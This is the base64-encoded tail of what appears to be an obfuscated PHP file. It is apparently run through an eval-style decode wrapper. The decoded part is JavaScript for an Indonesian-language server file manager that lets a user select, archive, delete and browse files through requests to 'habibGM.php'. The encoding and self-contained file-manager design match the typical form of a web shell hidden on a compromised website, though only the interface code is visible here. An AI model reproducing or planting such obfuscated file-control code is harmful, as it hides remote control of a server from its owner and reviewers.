0cy1jb250YWluZXInKTsNCiAgICBjb25zdCBkZWxldGVNb2RhbCA9IG5ldyBib290c3RyYXAuTW9kYWwoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlbGV0ZU1vZGFsJykpOw0KICAgIGNvbnN0IGRlbGV0ZUxpc3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVsZXRlLWxpc3QnKTsNCiAgICBjb25zdCBkZWxldGVJbnB1dHNDb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVsZXRlLWlucHV0cy1jb250YWluZXInKTsNCiAgICBjb25zdCBhcmNoaXZlVmlld2VyTW9kYWwgPSBuZXcgYm9vdHN0cmFwLk1vZGFsKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhcmNoaXZlVmlld2VyTW9kYWwnKSk7DQogICAgY29uc3QgYXJjaGl2ZUNvbnRlbnRzTGlzdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhcmNoaXZlLWNvbnRlbnRzLWxpc3QnKTsNCg0KDQogICAgZnVuY3Rpb24gdXBkYXRlQWN0aW9uQnV0dG9ucygpIHsNCiAgICAgICAgY29uc3QgY2hlY2tlZEl0ZW1zID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLml0ZW0tY2hlY2tib3g6Y2hlY2tlZCcpOw0KICAgICAgICBhcmNoaXZlQnRuLmRpc2FibGVkID0gY2hlY2tlZEl0ZW1zLmxlbmd0aCA9PT0gMDsNCiAgICAgICAgZGVsZXRlQnRuLmRpc2FibGVkID0gY2hlY2tlZEl0ZW1zLmxlbmd0aCA9PT0gMDsNCiAgICB9DQoNCiAgICAvLyBNZW5nYWt0aWZrYW4gYXRhdSBtZW5vbmFrdGlma2FuIHRvbWJvbCBha3NpIHNhYXQgY2VrYm94IGRpdWJhaA0KICAgIGl0ZW1DaGVja2JveGVzLmZvckVhY2goY2hlY2tib3ggPT4gew0KICAgICAgICBjaGVja2JveC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB1cGRhdGVBY3Rpb25CdXR0b25zKTsNCiAgICB9KTsNCg0KICAgIC8vIExvZ2lrYSAiUGlsaWggU2VtdWEiDQogICAgc2VsZWN0QWxsQ2hlY2tib3guYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGl0ZW1DaGVja2JveGVzLmZvckVhY2goY2hlY2tib3ggPT4gew0KICAgICAgICAgICAgY2hlY2tib3guY2hlY2tlZCA9IHRoaXMuY2hlY2tlZDsNCiAgICAgICAgfSk7DQogICAgICAgIHVwZGF0ZUFjdGlvbkJ1dHRvbnMoKTsNCiAgICB9KTsNCg0KICAgIC8vIEV2ZW50IGxpc3RlbmVyIHVudHVrIHRvbWJvbCBBcnNpcGthbg0KICAgIGFyY2hpdmVCdG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7DQogICAgICAgIGNvbnN0IGNoZWNrZWRJdGVtcyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5pdGVtLWNoZWNrYm94OmNoZWNrZWQnKTsNCiAgICAgICAgYXJjaGl2ZUxpc3QuaW5uZXJIVE1MID0gJyc7DQogICAgICAgIGFyY2hpdmVJbnB1dHNDb250YWluZXIuaW5uZXJIVE1MID0gJyc7DQoNCiAgICAgICAgY2hlY2tlZEl0ZW1zLmZvckVhY2goaXRlbSA9PiB7DQogICAgICAgICAgICBjb25zdCBpdGVtTmFtZSA9IGl0ZW0udmFsdWU7DQogICAgICAgICAgICBjb25zdCBsaXN0SXRlbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xpJyk7DQogICAgICAgICAgICBsaXN0SXRlbS5jbGFzc05hbWUgPSAnbGlzdC1ncm91cC1pdGVtIGdlbGFzJzsNCiAgICAgICAgICAgIGxpc3RJdGVtLnRleHRDb250ZW50ID0gaXRlbU5hbWU7DQogICAgICAgICAgICBhcmNoaXZlTGlzdC5hcHBlbmRDaGlsZChsaXN0SXRlbSk7DQoNCiAgICAgICAgICAgIGNvbnN0IGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsNCiAgICAgICAgICAgIGlucHV0LnR5cGUgPSAnaGlkZGVuJzsNCiAgICAgICAgICAgIGlucHV0Lm5hbWUgPSAnYXJjaGl2ZV9pdGVtc1tdJzsNCiAgICAgICAgICAgIGlucHV0LnZhbHVlID0gaXRlbU5hbWU7DQogICAgICAgICAgICBhcmNoaXZlSW5wdXRzQ29udGFpbmVyLmFwcGVuZENoaWxkKGlucHV0KTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgYXJjaGl2ZU1vZGFsLnNob3coKTsNCiAgICB9KTsNCiAgICAgICAgLy8gRXZlbnQgbGlzdGVuZXIgdW50dWsgdG9tYm9sIEhhcHVzDQogICAgZGVsZXRlQnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkgew0KICAgICAgICBjb25zdCBjaGVja2VkSXRlbXMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuaXRlbS1jaGVja2JveDpjaGVja2VkJyk7DQogICAgICAgIGRlbGV0ZUxpc3QuaW5uZXJIVE1MID0gJyc7DQogICAgICAgIGRlbGV0ZUlucHV0c0NvbnRhaW5lci5pbm5lckhUTUwgPSAnJzsNCg0KICAgICAgICBjaGVja2VkSXRlbXMuZm9yRWFjaChpdGVtID0+IHsNCiAgICAgICAgICAgIGNvbnN0IGl0ZW1OYW1lID0gaXRlbS52YWx1ZTsNCiAgICAgICAgICAgIGNvbnN0IGxpc3RJdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGknKTsNCiAgICAgICAgICAgIGxpc3RJdGVtLmNsYXNzTmFtZSA9ICdsaXN0LWdyb3VwLWl0ZW0gZ2VsYXMnOw0KICAgICAgICAgICAgbGlzdEl0ZW0udGV4dENvbnRlbnQgPSBpdGVtTmFtZTsNCiAgICAgICAgICAgIGRlbGV0ZUxpc3QuYXBwZW5kQ2hpbGQobGlzdEl0ZW0pOw0KDQogICAgICAgICAgICBjb25zdCBpbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7DQogICAgICAgICAgICBpbnB1dC50eXBlID0gJ2hpZGRlbic7DQogICAgICAgICAgICBpbnB1dC5uYW1lID0gJ2RlbGV0ZV9pdGVtc1tdJzsNCiAgICAgICAgICAgIGlucHV0LnZhbHVlID0gaXRlbU5hbWU7DQogICAgICAgICAgICBkZWxldGVJbnB1dHNDb250YWluZXIuYXBwZW5kQ2hpbGQoaW5wdXQpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBkZWxldGVNb2RhbC5zaG93KCk7DQogICAgfSk7DQoNCiAgICAgICAgYXVkaW9Nb2RhbC5hZGRFdmVudExpc3RlbmVyKCdoaWRlLmJzLm1vZGFsJywgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgYXVkaW9QbGF5ZXIucGF1c2UoKTsgLy8gTWVuZ2hlbnRpa2FuIGF1ZGlvIHNhYXQgbW9kYWwgZGl0dXR1cA0KICAgICAgICAgICAgYXVkaW9QbGF5ZXIuY3VycmVudFRpbWUgPSAwOyAvLyBNZW5nYXR1ciB1bGFuZyB3YWt0dSBhdWRpbw0KICAgICAgICB9KTsNCiAgICAgIA0KICAgIC8vIE5ldzogQXJjaGl2ZSBWaWV3ZXIgTG9naWMNCiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcudmlldy1hcmNoaXZlLWJ0bicpLmZvckVhY2goYnV0dG9uID0+IHsNCiAgICAgICAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgY29uc3QgZmlsZU5hbWUgPSB0aGlzLmdldEF0dHJpYnV0ZSgnZGF0YS1maWxlbmFtZScpOw0KICAgICAgICAgICAgY29uc3QgY3VycmVudFBhdGggPSAiPD9waHAgZWNobyB1cmxlbmNvZGUoJGRpcik7ID8+IjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gU2hvdyBsb2FkaW5nIG1lc3NhZ2UNCiAgICAgICAgICAgIGFyY2hpdmVDb250ZW50c0xpc3QuaW5uZXJIVE1MID0gYDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIHRleHQtY2VudGVyIj5NZW11YXQgaXNpIGFyc2lwLi4uPC9saT5gOw0KDQogICAgICAgICAgICBmZXRjaChgaGFiaWJHTS5waHA/YWN0aW9uPXZpZXdfYXJjaGl2ZV9jb250ZW50cyZwYXRoPSR7Y3VycmVudFBhdGh9JmZpbGU9JHtlbmNvZGVVUklDb21wb25lbnQoZmlsZU5hbWUpfWApDQogICAgICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKQ0KICAgICAgICAgICAgICAgIC50aGVuKGRhdGEgPT4gew0KICAgICAgICAgICAgICAgICAgICBhcmNoaXZlQ29udGVudHNMaXN0LmlubmVySFRNTCA9ICcnOyAvLyBDbGVhciBsb2FkaW5nIG1lc3NhZ2UNCg0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0YS5zdWNjZXNzICYmIGRhdGEuY29udGVudHMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5jb250ZW50cy5mb3JFYWNoKGl0ZW0gPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGxpc3RJdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGknKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaScpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RJdGVtLmNsYXNzTmFtZSA9ICdsaXN0LWdyb3VwLWl0ZW0gZ2VsYXMnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIENoZWNrIGlmIHRoZSBpdGVtIGlzIGEgZGlyZWN0b3J5IChlbmRzIHdpdGggJy8nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpdGVtLm5hbWUuZW5kc1dpdGgoJy8nKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpY29uLmNsYXNzTmFtZSA9ICdmYXMgZmEtZm9sZGVyIG1lLTInOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0SXRlbS50ZXh0Q29udGVudCA9IGl0ZW0ubmFtZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpY29uLmNsYXNzTmFtZSA9ICdmYXIgZmEtZmlsZSBtZS0yJzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlzdEl0ZW0udGV4dENvbnRlbnQgPSBgJHtpdGVtLm5hbWV9ICgkeyhpdGVtLnNpemUgLyAxMDI0KS50b0ZpeGVkKDIpfSBLQilgOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RJdGVtLnByZXBlbmQoaWNvbik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJjaGl2ZUNvbnRlbnRzTGlzdC5hcHBlbmRDaGlsZChsaXN0SXRlbSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFyY2hpdmVDb250ZW50c0xpc3QuaW5uZXJIVE1MID0gYDxsaSBjbGFzcz0ibGlzdC1ncm91cC1pdGVtIHRleHQtY2VudGVyIj5HYWdhbCBtZW11YXQgaXNpIGFyc2lwIGF0YXUgYXJzaXAga29zb25nLjwvbGk+YDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pDQogICAgICAgICAgICAgICAgLmNhdGNoKGVycm9yID0+IHsNCiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3I6JywgZXJyb3IpOw0KICAgICAgICAgICAgICAgICAgICBhcmNoaXZlQ29udGVudHNMaXN0LmlubmVySFRNTCA9IGA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSB0ZXh0LWNlbnRlciI+VGVyamFkaSBrZXNhbGFoYW4gc2FhdCBtZW5nYW1iaWwgZGF0YS48L2xpPmA7DQogICAgICAgICAgICAgICAgfSk7DQoNCiAgICAgICAgICAgIGFyY2hpdmVWaWV3ZXJNb2RhbC5zaG93KCk7DQogICAgICAgIH0pOw0KICAgIH0pOw0KICAgIH0pOw0KICAgIDwvc2NyaXB0Pg0KICAgIA0KPC9ib2R5Pg0KPC9odG1sPg0KPD9waHAgDQp9IA0KPz4=')); ?>